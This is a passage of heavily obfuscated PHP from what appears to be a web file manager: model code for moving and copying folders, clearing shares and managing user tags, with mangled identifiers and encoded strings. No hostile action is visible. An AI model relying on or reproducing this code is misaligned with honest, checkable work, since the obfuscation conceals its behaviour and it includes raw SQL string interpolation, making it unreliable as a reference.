$this->lockWriteEnd($™Ö»­ã¾, $’…‡ ¥); $this->folderSizeReset($ÑøèŠî˜[$‚Ù¾ªí¶[192]]); $this->folderSizeReset($™Ö»­ã¾); $ë©¤Å„À = array($ÑøèŠî˜[$‚Ù¾ªí¶[192]], $™Ö»­ã¾); if ($ÑøèŠî˜[$‚Ù¾ªí¶[485]] == $‚Ù¾ªí¶[91]) { $ë©¤Å„À[] = $·Ì½Ò£€; } $this->updateModifyTime($ë©¤Å„À); Model($‚Ù¾ªí¶[633])->eventMove($·Ì½Ò£€, $ÑøèŠî˜[$‚Ù¾ªí¶[192]], $™Ö»­ã¾); Hook::trigger($‚Ù¾ªí¶[659], $Ø¤ïÌµ”); return $Ÿ“§; } private function _move($í´Ş‹¬í, $Ô×‘§‡½, $œ¿¿”ó, &$ßÂİƒ‹Š, $ùïŞä = '') { $¼—¤Ì÷ =& $_SERVER[‹è™Ü¸Ñ]; $´§‚šëÔ = $this->sourceInfo($í´Ş‹¬í); $±†£›ÇØ = $´§‚šëÔ[$¼—¤Ì÷[485]] == $¼—¤Ì÷[91]; $Ô§ãùù• = $ùïŞä ? $ùïŞä : $´§‚šëÔ[$¼—¤Ì÷[32]]; $Ÿâ°ç¢Ì = $this->fileNameExistAuto($Ô×‘§‡½, $´§‚šëÔ); $this->lockMoveStart($í´Ş‹¬í); $this->lockWriteStart($Ô×‘§‡½, $Ô§ãùù•); if (!$Ÿâ°ç¢Ì) { return $this->_moveForce($í´Ş‹¬í, $Ô×‘§‡½, $Ô§ãùù•); } $²ÊÌ˜ƒ = $Ÿâ°ç¢Ì; $¥Ùê©± = !1; if ($±†£›ÇØ) { if ($œ¿¿”ó == REPEAT_RENAME_FOLDER) { $Ô§ãùù• = $this->fileNameAuto($Ô×‘§‡½, $Ô§ãùù•, $œ¿¿”ó, $±†£›ÇØ); $²ÊÌ˜ƒ = $this->_moveForce($í´Ş‹¬í, $Ô×‘§‡½, $Ô§ãùù•); } else { if ($œ¿¿”ó == REPEAT_RENAME_FOLDER) { $œ¿¿”ó = REPEAT_RENAME; } $ıÍº‚˜Ÿ = $this->_childrenListSelect($í´Ş‹¬í); foreach ($ıÍº‚˜Ÿ as $ÒÅïø‘¥) { $this->_move($ÒÅïø‘¥[$¼—¤Ì÷[193]], $Ÿâ°ç¢Ì, $œ¿¿”ó, $ßÂİƒ‹Š); } $¥Ùê©± = !0; } } else { if ($œ¿¿”ó == REPEAT_SKIP) { $¥Ùê©± = !0; } else { if ($œ¿¿”ó == REPEAT_RENAME || $œ¿¿”ó == REPEAT_RENAME_FOLDER) { $Ô§ãùù• = $this->fileNameAuto($Ô×‘§‡½, $Ô§ãùù•, $œ¿¿”ó, $±†£›ÇØ); $²ÊÌ˜ƒ = $this->_moveForce($í´Ş‹¬í, $Ô×‘§‡½, $Ô§ãùù•); } else { if ($œ¿¿”ó == REPEAT_REPLACE) { $è”£×é = $this->sourceInfoCache($Ÿâ°ç¢Ì); $ÈÈ–ğ˜º = $this->fileHistory($è”£×é, $´§‚šëÔ[$¼—¤Ì÷[541]], $´§‚šëÔ[$¼—¤Ì÷[79]]); $¥Ùê©± = !0; if ($ÈÈ–ğ˜º) { $ßÂİƒ‹Š[$¼—¤Ì÷[629]][] = $´§‚šëÔ[$¼—¤Ì÷[541]]; } } } } } if ($¥Ùê©± && !$ßÂİƒ‹Š[$¼—¤Ì÷[660]]) { $ßÂİƒ‹Š[$¼—¤Ì÷[660]] = !0; } return $²ÊÌ˜ƒ; } private function _moveForce($»–öŒª, $Ù®·â¸Ø, $ÍÎò§¯º) { $‚ø–¡ãà =& $_SERVER[‹è™Ü¸Ñ]; $ÑÓÌ§ª„ = $this->sourceInfo($»–öŒª); $©¾™ğœ™ = $this->sourceInfo($Ù®·â¸Ø); $Ñ…É×„ü = $ÑÓÌ§ª„[$‚ø–¡ãà[485]] == $‚ø–¡ãà[91]; $ëñÆ´¢ = array($‚ø–¡ãà[477] => $©¾™ğœ™[$‚ø–¡ãà[193]], $‚ø–¡ãà[652] => $©¾™ğœ™[$‚ø–¡ãà[584]] . $©¾™ğœ™[$‚ø–¡ãà[193]] . $‚ø–¡ãà[50], $‚ø–¡ãà[648] => $©¾™ğœ™[$‚ø–¡ãà[190]], $‚ø–¡ãà[649] => $©¾™ğœ™[$‚ø–¡ãà[569]], $‚ø–¡ãà[651] => USER_ID, $‚ø–¡ãà[494] => $ÍÎò§¯º); $ûàÅò” = $ÑÓÌ§ª„[$‚ø–¡ãà[190]] == SourceModel::TYPE_GROUP && $©¾™ğœ™[$‚ø–¡ãà[190]] == SourceModel::TYPE_GROUP && $ÑÓÌ§ª„[$‚ø–¡ãà[569]] == $©¾™ğœ™[$‚ø–¡ãà[569]]; if (!$ûàÅò” && $this->moveClearAuth) { Model($‚ø–¡ãà[567])->authClear($»–öŒª); } $¯¥¶ÈËã = $ÑÓÌ§ª„[$‚ø–¡ãà[505]] == $‚ø–¡ãà[91] && $©¾™ğœ™[$‚ø–¡ãà[505]] != $‚ø–¡ãà[91]; if ($¯¥¶ÈËã) { $ëñÆ´¢[$‚ø–¡ãà[504]] = 0; } if ($Ñ…É×„ü) { $À‡Ó“Åß = array($‚ø–¡ãà[652] => array($‚ø–¡ãà[612], $ÑÓÌ§ª„[$‚ø–¡ãà[584]] . $ÑÓÌ§ª„[$‚ø–¡ãà[193]] . $‚ø–¡ãà[613])); $ë•Û”Òù = $ÑÓÌ§ª„[$‚ø–¡ãà[584]] . $ÑÓÌ§ª„[$‚ø–¡ãà[193]] . $‚ø–¡ãà[50]; $«Â²¡¡ = $©¾™ğœ™[$‚ø–¡ãà[584]] . $©¾™ğœ™[$‚ø–¡ãà[193]] . $‚ø–¡ãà[50] . $ÑÓÌ§ª„[$‚ø–¡ãà[193]] . $‚ø–¡ãà[50]; $Œš¬í«¦ = array($‚ø–¡ãà[652] => array($‚ø–¡ãà[661], "\162\x65\160\154\x61\x63\x65\x28\x70\141\162\x65\x6e\164\114\145\166\145\x6c\54\x27{$ë•Û”Òù}\47\54\47{$«Â²¡¡}\x27\51"), $‚ø–¡ãà[648] => $©¾™ğœ™[$‚ø–¡ãà[190]], $‚ø–¡ãà[649] => $©¾™ğœ™[$‚ø–¡ãà[569]]); if ($¯¥¶ÈËã) { $Œš¬í«¦[$‚ø–¡ãà[504]] = 0; } $this->where($À‡Ó“Åß)->data($Œš¬í«¦)->save(); } $this->where(array($‚ø–¡ãà[491] => $»–öŒª))->data($ëñÆ´¢)->save(); return $»–öŒª; } private function clearShare($ÏÚµàÌİ, $Ù‰ÂßÒ¬) { $Œäê¶¤ =& $_SERVER[‹è™Ü¸Ñ]; $Ã¥§¬Êë = $this->sourceInfo($ÏÚµàÌİ); $¡ê½İ™ = $this->sourceInfo($Ù‰ÂßÒ¬); if ($Ã¥§¬Êë[$Œäê¶¤[569]] == $¡ê½İ™[$Œäê¶¤[569]] && $Ã¥§¬Êë[$Œäê¶¤[190]] == $Œäê¶¤[662]) { return; } $¬ë÷‡³ë = array($Œäê¶¤[584] => array($Œäê¶¤[612], $Ã¥§¬Êë[$Œäê¶¤[584]] . $ÏÚµàÌİ . $Œäê¶¤[613])); $¤úœú‚ì = $this->field($Œäê¶¤[491])->where($¬ë÷‡³ë)->getField($Œäê¶¤[193], !0); if (!$¤úœú‚ì) { return; } $¬ë÷‡³ë = array($Œäê¶¤[193] => array($Œäê¶¤[7], $¤úœú‚ì), $Œäê¶¤[663] => 1); $ğïÁÊºó = Model($Œäê¶¤[664])->field($Œäê¶¤[665])->where($¬ë÷‡³ë)->select(); if (!$ğïÁÊºó) { return; } $ğïÁÊºó = array_to_keyvalue($ğïÁÊºó, $Œäê¶¤[12], $Œäê¶¤[665]); $¬ë÷‡³ë = array($Œäê¶¤[665] => array($Œäê¶¤[7], $ğïÁÊºó)); Model($Œäê¶¤[664])->where($¬ë÷‡³ë)->save(array($Œäê¶¤[663] => 0)); Model($Œäê¶¤[666])->where($¬ë÷‡³ë)->delete(); } public function copyFolderFromIO($ÌÛšâ™«, $Ş•¦”·†, $ğ¤ëºö, $–…Ì§í, $şÅ«¼©ö, $ÁÅü€° = false) { $Ô ¬ûÊ¬ =& $_SERVER[‹è™Ü¸Ñ]; $ô¥Ê¨¾’ = array($Ô ¬ûÊ¬[630] => array(), $Ô ¬ûÊ¬[631] => array(), $Ô ¬ûÊ¬[629] => array(), $Ô ¬ûÊ¬[667] => array()); $€Ò‰¾´ = $ÁÅü€° ? $ÁÅü€° : $ÌÛšâ™«->pathThis($Ş•¦”·†); $æôÍçàÈ = $this->fileNameExist($ğ¤ëºö, $€Ò‰¾´); $Ë÷›¦€› = $this->mkdir($ğ¤ëºö, $€Ò‰¾´, $–…Ì§í); if (!$æôÍçàÈ || $–…Ì§í == REPEAT_RENAME_FOLDER) { $–…Ì§í = !1; } if ($æôÍçàÈ) { $this->_childrenAllMake($æôÍçàÈ); } Hook::trigger($Ô ¬ûÊ¬[668]); $this->_copyChildTo($ÌÛšâ™«, $Ş•¦”·†, $Ë÷›¦€›, $–…Ì§í, $ô¥Ê¨¾’, $şÅ«¼©ö); Hook::trigger($Ô ¬ûÊ¬[669]); if ($Ë÷›¦€›) { $this->folderSizeResetChildren($Ë÷›¦€›); } $this->_childrenListClear(); Model($Ô ¬ûÊ¬[632])->addAll($ô¥Ê¨¾’[$Ô ¬ûÊ¬[630]], array(), !0); Model($Ô ¬ûÊ¬[633])->eventCopy($Ë÷›¦€›); $this->saveAll($ô¥Ê¨¾’[$Ô ¬ûÊ¬[631]]); Model($Ô ¬ûÊ¬[544])->linkAdd($ô¥Ê¨¾’[$Ô ¬ûÊ¬[629]]); Model($Ô ¬ûÊ¬[544])->remove($ô¥Ê¨¾’[$Ô ¬ûÊ¬[667]]); $this->folderSizeReset($ğ¤ëºö); $this->updateModifyTime($ğ¤ëºö); return $Ë÷›¦€›; } private function _copyChildTo($œÍÓèûİ, $ìû“Ôî, $˜ñÚ±°Õ, $ÛÚŞ×ı£, &$·Š™ŸÉ¶, $ÁŞ­ª’) { $ıŸçºñÅ =& $_SERVER[‹è™Ü¸Ñ]; $°İ¶éÙì = $this->sourceInfoCache($˜ñÚ±°Õ); $÷æœ‰ŞÑ = $œÍÓèûİ->listPath($ìû“Ôî); $÷æœ‰ŞÑ = $÷æœ‰ŞÑ ? $÷æœ‰ŞÑ : array($ıŸçºñÅ[86] => array(), $ıŸçºñÅ[85] => array()); $•Ğ ÍÄÓ = array_merge($÷æœ‰ŞÑ[$ıŸçºñÅ[86]], $÷æœ‰ŞÑ[$ıŸçºñÅ[85]]); $¿¢¼µÈÓ = $this->_addFiles($œÍÓèûİ, $÷æœ‰ŞÑ[$ıŸçºñÅ[86]], $ÁŞ­ª’); $å‘£´¿© = array(); foreach ($•Ğ ÍÄÓ as &$ÆÓ£å¦Ê) { if (isset($¿¢¼µÈÓ[$ÆÓ£å¦Ê[$ıŸçºñÅ[32]]])) { $ÆÓ£å¦Ê = $¿¢¼µÈÓ[$ÆÓ£å¦Ê[$ıŸçºñÅ[32]]]; } $ÆÓ£å¦Ê[$ıŸçºñÅ[485]] = $ÆÓ£å¦Ê[$ıŸçºñÅ[33]] == $ıŸçºñÅ[78]; $ÆÓ£å¦Ê[$ıŸçºñÅ[486]] = substr(_get($ÆÓ£å¦Ê, $ıŸçºñÅ[169], $ıŸçºñÅ[12]), 0, 10); $ÆÓ£å¦Ê[$ıŸçºñÅ[79]] = _get($ÆÓ£å¦Ê, $ıŸçºñÅ[79], 0); $ÆÓ£å¦Ê[$ıŸçºñÅ[541]] = _get($ÆÓ£å¦Ê, $ıŸçºñÅ[541], 0); if (!isset($ÆÓ£å¦Ê[$ıŸçºñÅ[670]]) && $ÆÓ£å¦Ê[$ıŸçºñÅ[541]]) { $·Š™ŸÉ¶[$ıŸçºñÅ[667]][] = $ÆÓ£å¦Ê[$ıŸçºñÅ[541]]; } if ($ÛÚŞ×ı£) { $ØØÆı² = $this->fileNameExistCache($˜ñÚ±°Õ, $ÆÓ£å¦Ê[$ıŸçºñÅ[32]]); if ($ØØÆı²) { if ($ÆÓ£å¦Ê[$ıŸçºñÅ[485]] || $ÛÚŞ×ı£ == REPEAT_SKIP) { continue; } if ($ÛÚŞ×ı£ == REPEAT_REPLACE) { $´ææ» = $this->sourceInfoCache($ØØÆı²); $É­ŸÍÍÄ = $this->fileHistory($´ææ», $ÆÓ£å¦Ê[$ıŸçºñÅ[541]], $ÆÓ£å¦Ê[$ıŸçºñÅ[79]]); if ($É­ŸÍÍÄ) { $·Š™ŸÉ¶[$ıŸçºñÅ[629]][] = $ÆÓ£å¦Ê[$ıŸçºñÅ[541]]; } continue; } else { if ($ÛÚŞ×ı£ == REPEAT_RENAME) { $ÆÓ£å¦Ê[$ıŸçºñÅ[32]] = $this->fileNameAutoCache($˜ñÚ±°Õ, $ÆÓ£å¦Ê[$ıŸçºñÅ[32]], $ÛÚŞ×ı£, !1); } } } } if (!$ÆÓ£å¦Ê[$ıŸçºñÅ[485]] && $ÆÓ£å¦Ê[$ıŸçºñÅ[541]] == 0) { continue; } if (!$ÆÓ£å¦Ê[$ıŸçºñÅ[485]] && $ÆÓ£å¦Ê[$ıŸçºñÅ[541]]) { $·Š™ŸÉ¶[$ıŸçºñÅ[629]][] = $ÆÓ£å¦Ê[$ıŸçºñÅ[541]]; } $å‘£´¿©[] = $this->_makeItemData($ÆÓ£å¦Ê, $°İ¶éÙì, $ÆÓ£å¦Ê[$ıŸçºñÅ[32]]); } unset($ÆÓ£å¦Ê); if (!empty($å‘£´¿©)) { $this->addAll($å‘£´¿©); $this->_childrenListSelect($˜ñÚ±°Õ); } $‡èï†Ğú = $this->_childrenList($˜ñÚ±°Õ); $‡èï†Ğú = array_to_keyvalue($‡èï†Ğú, $ıŸçºñÅ[32]); foreach ($•Ğ ÍÄÓ as $ÆÓ£å¦Ê) { $´ææ» = $‡èï†Ğú[$ÆÓ£å¦Ê[$ıŸçºñÅ[32]]]; $¨ë¾î§ = $´ææ»[$ıŸçºñÅ[193]]; $this->_copyApplyMeta($´ææ», $·Š™ŸÉ¶); if ($ÆÓ£å¦Ê[$ıŸçºñÅ[33]] == $ıŸçºñÅ[78]) { $ÆÓ£å¦Ê[$ıŸçºñÅ[87]] = $œÍÓèûİ->getPathInner($ÆÓ£å¦Ê[$ıŸçºñÅ[87]]); $this->_copyChildTo($œÍÓèûİ, $ÆÓ£å¦Ê[$ıŸçºñÅ[87]], $¨ë¾î§, $ÛÚŞ×ı£, $·Š™ŸÉ¶, $ÁŞ­ª’); } } } private function _addFiles($½‘±¢ú², $İ»áÅ“Ç, $®‘şÇÜ) { $£àûØ =& $_SERVER[‹è™Ü¸Ñ]; if (!$İ»áÅ“Ç || count($İ»áÅ“Ç) == 0) { return array(); } $¬ÕÉ“‰ = array(); foreach ($İ»áÅ“Ç as &$É†à•İº) { Hook::trigger($£àûØ[671], $É†à•İº); $É†à•İº[$£àûØ[87]] = $½‘±¢ú²->getPathInner($É†à•İº[$£àûØ[87]]); $Ï“Õæ = $½‘±¢ú²->hashSimple($É†à•İº[$£àûØ[87]]); $ºÄ•ÆÜ¸ = $½‘±¢ú²->hashMd5($É†à•İº[$£àûØ[87]]); if (strlen($ºÄ•ÆÜ¸) > 10 && !isset($¬ÕÉ“‰[$ºÄ•ÆÜ¸])) { $¬ÕÉ“‰[$ºÄ•ÆÜ¸] = array(); } $É†à•İº[$£àûØ[672]] = $Ï“Õæ; $É†à•İº[$£àûØ[547]] = $ºÄ•ÆÜ¸; $¬ÕÉ“‰[$ºÄ•ÆÜ¸][] =& $É†à•İº; if (count($¬ÕÉ“‰[$ºÄ•ÆÜ¸]) > 1) { $É†à•İº[$£àûØ[670]] = !0; } Hook::trigger($£àûØ[673], $É†à•İº); } unset($É†à•İº); $Š¹£œë‰ = array($£àûØ[547] => array($£àûØ[7], array_keys($¬ÕÉ“‰))); $¼ìÄ„ˆ© = Model($£àûØ[674]); $ğìıùŞö = $¼ìÄ„ˆ©->where($Š¹£œë‰)->select(); $ğìıùŞö = $ğìıùŞö ? $ğìıùŞö : array(); foreach ($ğìıùŞö as $§¼Èø³) { if (!isset($¬ÕÉ“‰[$§¼Èø³[$£àûØ[547]]])) { continue; } $ÑåúÔ¬Š = $¬ÕÉ“‰[$§¼Èø³[$£àûØ[547]]]; foreach ($ÑåúÔ¬Š as &$É†à•İº) { $É†à•İº[$£àûØ[541]] = $§¼Èø³[$£àûØ[541]]; $É†à•İº[$£àûØ[670]] = !0; } unset($É†à•İº); } $•Ú©±‘ = array(); foreach ($İ»áÅ“Ç as $³Ñë“¡) { Hook::trigger($£àûØ[675], $³Ñë“¡); if (isset($³Ñë“¡[$£àûØ[670]]) && $³Ñë“¡[$£àûØ[670]]) { Hook::trigger($£àûØ[676], $³Ñë“¡); continue; } $‘¥‚ñÜ = $½‘±¢ú²->getPathInner($³Ñë“¡[$£àûØ[87]]); $Ñ›Ô±§â = $¼ìÄ„ˆ©->addFileMake($‘¥‚ñÜ, $³Ñë“¡[$£àûØ[79]], $³Ñë“¡[$£àûØ[672]], $³Ñë“¡[$£àûØ[547]], $³Ñë“¡[$£àûØ[32]], $®‘şÇÜ); Hook::trigger($£àûØ[676], $³Ñë“¡); if (!is_array($Ñ›Ô±§â)) { continue; } $•Ú©±‘[] = $Ñ›Ô±§â; } $¼ìÄ„ˆ©->addAll($•Ú©±‘); $Š¹£œë‰ = array($£àûØ[547] => array($£àûØ[7], array_keys($¬ÕÉ“‰))); $ğìıùŞö = $¼ìÄ„ˆ©->where($Š¹£œë‰)->select(); $ğìıùŞö = $ğìıùŞö ? $ğìıùŞö : array(); foreach ($ğìıùŞö as $§¼Èø³) { if (!isset($¬ÕÉ“‰[$§¼Èø³[$£àûØ[547]]])) { continue; } $Ê§÷ëøõ =& $¬ÕÉ“‰[$§¼Èø³[$£àûØ[547]]]; foreach ($Ê§÷ëøõ as &$É†à•İº) { $É†à•İº[$£àûØ[541]] = $§¼Èø³[$£àûØ[541]]; } unset($É†à•İº); } $À¼¿Š†™ = array(); foreach ($İ»áÅ“Ç as $¯â‘ê¸ù) { $À¼¿Š†™[$¯â‘ê¸ù[$£àûØ[32]]] = $¯â‘ê¸ù; } return $À¼¿Š†™; } } define($_SERVER[‹è™Ü¸Ñ][677], $_SERVER[‹è™Ü¸Ñ][678]); $dchnilezfb = $_SERVER[‹è™Ü¸Ñ][679]; goto dÙö¦ìé¬Ğ; Cº©ƒÂ¤“: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($§ÖÒÇ‹¯) { $Õ…¬œ¯ô =& $_SERVER[‹è™Ü¸Ñ]; return array($Õ…¬œ¯ô[2066] => array($Õ…¬œ¯ô[2482] . USER_ID, $Õ…¬œ¯ô[2067])); } protected function listData() { $Ñˆ¸½ÇÂ =& $_SERVER[‹è™Ü¸Ñ]; $Úö¥Ÿõç = array($Ñˆ¸½ÇÂ[1743] => USER_ID, $Ñˆ¸½ÇÂ[557] => array($Ñˆ¸½ÇÂ[2070], 0)); $ã¥•øí = $Ñˆ¸½ÇÂ[2483]; $ÉÓû– = $this->field($ã¥•øí)->where($Úö¥Ÿõç)->order($Ñˆ¸½ÇÂ[2073])->select(); return $ÉÓû– ? $ÉÓû– : array(); } protected function addToTag($ŠàÕåì¿, $å§å©™à) { $½ËÇŞÎï =& $_SERVER[‹è™Ü¸Ñ]; if (!Model($½ËÇŞÎï[2217])->listData($å§å©™à)) { return !1; } if (is_numeric($ŠàÕåì¿)) { $°İòÎÏˆ = Model($½ËÇŞÎï[879])->pathInfo($ŠàÕåì¿); if (!$°İòÎÏˆ) { return !1; } } else { $°İòÎÏˆ = IO::infoSimple($ŠàÕåì¿); if (!$°İòÎÏˆ) { return !1; } $¹ú¢·¡Ü = $°İòÎÏˆ[$½ËÇŞÎï[32]]; $ÕÓáá–š = $°İòÎÏˆ[$½ËÇŞÎï[33]]; if (isset($°İòÎÏˆ[$½ËÇŞÎï[485]])) { $ÕÓáá–š = $°İòÎÏˆ[$½ËÇŞÎï[485]] == $½ËÇŞÎï[91] ? $½ËÇŞÎï[78] : $½ËÇŞÎï[230]; } } $É‘Ëâ…ç = array($½ËÇŞÎï[1743] => USER_ID, $½ËÇŞÎï[557] => $å§å©™à, $½ËÇŞÎï[495] => $ŠàÕåì¿, $½ËÇŞÎï[496] => $ÕÓáá–š ? $ÕÓáá–š : $½ËÇŞÎï[490], $½ËÇŞÎï[494] => $¹ú¢·¡Ü ? $¹ú¢·¡Ü : $½ËÇŞÎï[12], $½ËÇŞÎï[1955] => 0); if ($this->where($É‘Ëâ…ç)->find()) { return !1; } return $this->add($É‘Ëâ…ç); } protected function removeFromTag($çĞıØÁ, $ô«€¬øŸ) { $ÂÊŒÍÇä =& $_SERVER[‹è™Ü¸Ñ]; if (!Model($ÂÊŒÍÇä[2217])->listData($ô«€¬øŸ)) { return !1; } if (is_array($çĞıØÁ)) { $çĞıØÁ = array($ÂÊŒÍÇä[7], $çĞıØÁ); } $¼ïúìû­ = array($ÂÊŒÍÇä[1743] => USER_ID, $ÂÊŒÍÇä[557] => $ô«€¬øŸ, $ÂÊŒÍÇä[495] => $çĞıØÁ); return $this->where($¼ïúìû­)->delete(); } protected function removeByTag($å•‰«ıŠ) { $¸†ß‘Ñ =& $_SERVER[‹è™Ü¸Ñ]; if (!$å•‰«ıŠ) { return !1; } $Ü­áÇ÷İ = array($¸†ß‘Ñ[1743] => USER_ID, $¸†ß‘Ñ[557] => $å•‰«ıŠ); return $this->where($Ü­áÇ÷İ)->delete(); } protected function removeBySource($«Ş•¹İå) { $ññ¾ú’ =& $_SERVER[‹è™Ü¸Ñ]; if (is_array($«Ş•¹İå)) { $«Ş•¹İå = array($ññ¾ú’[7], $«Ş•¹İå); } $Ù¨ñœç = array($ññ¾ú’[1743] => USER_ID, $ññ¾ú’[557] => array($ññ¾ú’[1072], 0), $ññ¾ú’[495] => $«Ş•¹İå); return $this->where($Ù¨ñœç)->delete(); } }